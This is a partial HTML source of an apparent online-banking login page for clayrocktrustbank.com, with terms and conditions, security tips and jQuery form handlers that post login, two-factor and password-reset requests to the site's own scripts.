...
<head>
    ...
    <link rel="shortcut icon" href="auth/images/favicon.jpeg" type="image/x-icon">
    <!-- Fav Icon  -->
    <link rel="shortcut icon" href="auth/images/favicon.jpeg">
    <!-- Page Title  -->
    <title>Home | Welcome to clayrocktrustbank.com Online Banking</title>
    <!-- StyleSheets  -->
    <link rel="stylesheet" href="auth/assets/css/dashlite.css?ver=2.4.0">
    <link rel="stylesheet" href="auth/scss/sweetalert.css">
    <link id="skin-default" rel="stylesheet" href="auth/assets/css/theme.css?ver=2.4.0">
    <link id="skin-default" rel="stylesheet" href="auth/assets/css/theme.css?ver=2.4.0">
                ...
                <div class="nk-block nk-block-middle nk-auth-body">
                    <div class="brand-logo pb-5">
                        <a href="../" class="logo-link">
                            <img class="logo-light logo-img logo-img-lg" src="../logo.jpeg" srcset="../logo.jpeg" alt="logo">
                            <img class="logo-dark logo-img logo-img-lg" src="../logo.jpeg" srcset="../logo.jpeg" alt="logo-dark">
                        </a>
                    </div>
...
- clayrocktrustbank.com ACCOUNT ID, PASSWORD and ACCOUNT PIN   you choose to identify 
...
d. clayrocktrustbank.com do not accept responsibility for any loss you or anybody else may suffer because any instructions or information you sent us are sent in 
error, fail to reach us or are distorted unless you have been the victim of fraud.

e. clayrocktrustbank.com do not accept responsibility for any loss you or anybody else may suffer because any instructions or information we send you fail to reach
 you or are distorted unless you have been the victim of fraud.

5. HOW WE CAN CHANGE THESE CONDITIONS

a. clayrocktrustbank.com change these conditions for any reason by giving you written notice or publishing the change on our website.
...
clayrocktrustbank.com service is available to you if you are 18 years of age or over.
</textarea>
                        <br><br>
                ...
                <div class="nk-block nk-auth-footer">
                    ...
                    <div class="mt-3">
                        <p>&copy; 2024 clayrocktrustbank.com. All Rights Reserved.</p>
                    </div>
                </div>
                <!-- .nk-block -->
            </div>
                ...
                <div class="slider-wrap w-100 w-max-550px p-3 p-sm-5 m-auto">
                    <div class="slider-init" data-slick='{"dots":true, "arrows":false}'>
                        <div class="slider-item">
                            <div class="nk-feature nk-feature-center">
                                ...
                                <div class="nk-feature-content py-4 p-sm-5">
                                    ...
                                    <p>We have security measures in place to safeguard your money, because we are committed to providing you with a secure banking experience. When we come across any hoaxes or scams that target customers, we will raise them
                                        to your attention.</p>
                                </div>
                            </div>
                        </div>
                        ...
                        <div class="slider-item">
                            <div class="nk-feature nk-feature-center">
                                <div class="nk-feature-img">
                                    <img class="round" src="auth/images/banking.svg" srcset="auth/images/banking.svg 2x" alt="">
                                </div>
                                <div class="nk-feature-content py-4 p-sm-5">
                                    <h4>clayrocktrustbank.com</h4>
                                    <p>We'll never send an email containing a link to clayrocktrustbank.com.<br> We'll never ask for your passwords or Secret Code.</p>
                                </div>
                            </div>
                        </div>
                        <!-- .slider-item -->
                        <div class="slider-item">
                            <div class="nk-feature nk-feature-center">
                                <div class="nk-feature-img">
                                    <img class="round" src="auth/images/onlinebanking.svg" srcset="auth/images/onlinebanking.svg 2x" alt="">
                                </div>
                                <div class="nk-feature-content py-4 p-sm-5">
                                    <h4>clayrocktrustbank.com</h4>
                                    <p>When accessing clayrocktrustbank.com online banking, always open a new browser window and type clayrocktrustbank.com</p>
                                </div>
                            </div>
                        </div>
                        <!-- .slider-item -->
    ...
    <script type="text/javascript">
        $(document).ready(function(e) {
            $("#loginForm").on('submit', (function(e) {
                ...
                e.preventDefault();
                $.ajax({
                    url: "auth/scripts/auth?action=userLogin",
                    type: "POST",
        ...
        $(document).ready(function(e) {
            $("#2faForm").on('submit', (function(e) {
                ...
                e.preventDefault();
                $.ajax({
                    url: "auth/scripts/auth?action=userVerify2fa",
                    type: "POST",
                    data: new FormData(this),
                    contentType: false,
                    cache: false,
        ...
        $(document).ready(function(e) {
            $("#resetForm").on('submit', (function(e) {
                ...
                e.preventDefault();
                $.ajax({
                    url: "auth/scripts/auth?action=userPassReset&code=176844",
                    type: "POST",
                    data: new FormData(this),
                    contentType: false,
                    cache: false,
    ...
    <script src="auth/assets/js/bundle.js?ver=2.4.0"></script>
    <script src="auth/assets/js/scripts.js?ver=2.4.0"></script>
